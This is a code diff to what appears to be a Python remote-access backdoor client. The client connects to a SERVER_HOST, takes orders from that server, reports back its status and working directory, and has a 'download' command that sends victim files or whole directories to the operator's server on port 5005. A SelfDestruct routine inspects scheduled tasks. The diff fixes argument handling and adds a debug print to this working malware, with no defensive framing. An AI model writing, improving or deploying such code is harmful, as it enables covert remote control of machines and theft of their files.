@@ -115,7 +115,7 @@ def SelfDestruct():
         print(f"Error running schtasks: {e}")
         out = None
 
-    if out:  # ✅ Make sure out is not None
+    if out:
         for block in re.split(r'\n\s*\n', out):
             if path.lower() in block.lower():
                 for line in block.splitlines():
@@ -167,23 +167,27 @@ def EstablishConnection():
             if command.lower() == "exit":
                 break
             if splited_command[0].lower() == "download":
-                if splited_command[1].lower() == "-r":
-                    try:
-                        DownloadDirectory(splited_command[2], splited_command[3], SERVER_HOST, 5005)
-                        output = f"Downloaded {splited_command[2]}"
-                    except Exception as e:
-                        output = f"An error occurred: {e}, Make sure you Started the Receiver Server and use the command correctly 'Download -r <directory> <max_depth>'"
+                if len(splited_command) < 2:
+                    output = "Please provide a file or directory to download."
                     found = True
                 else:
-                    try:
-                        DownloadFile(splited_command[1], SERVER_HOST, 5005)
-                        output = f"Downloaded {splited_command[1]}"
-                    except Exception as e:
-                        output = f"An error occurred: {e}, Have you started the Receiver Server? If not use 'StartFileServer' command to start the server."
-                    found = True
+                    if splited_command[1].lower() == "-r":
+                        try:
+                            DownloadDirectory(splited_command[2], splited_command[3], SERVER_HOST, 5005)
+                            output = f"Downloaded {splited_command[2]}"
+                        except Exception as e:
+                            output = f"An error occurred: {e}, Make sure you Started the Receiver Server and use the command correctly 'Download -r <directory> <max_depth>'"
+                        found = True
+                    else:
+                        try:
+                            DownloadFile(splited_command[1], SERVER_HOST, 5005)
+                            output = f"Downloaded {splited_command[1]}"
+                        except Exception as e:
+                            output = f"An error occurred: {e}, Have you started the Receiver Server? If not use 'StartFileServer' command to start the server."
+                        found = True
             if command.lower() == "start file server":
+                output = ""
                 found = True
-                continue
             if command.lower() == "ping":
                 output = "ACTIVE"
                 found = True
@@ -260,6 +264,7 @@ def EstablishConnection():
             cwd = os.getcwd()
             # send the results back to the server
             message = f"{output}{SEPARATOR}{cwd}"
+            print(f"Sending: {message}")
             s.send(message.encode())
         # close client connection
         s.close()
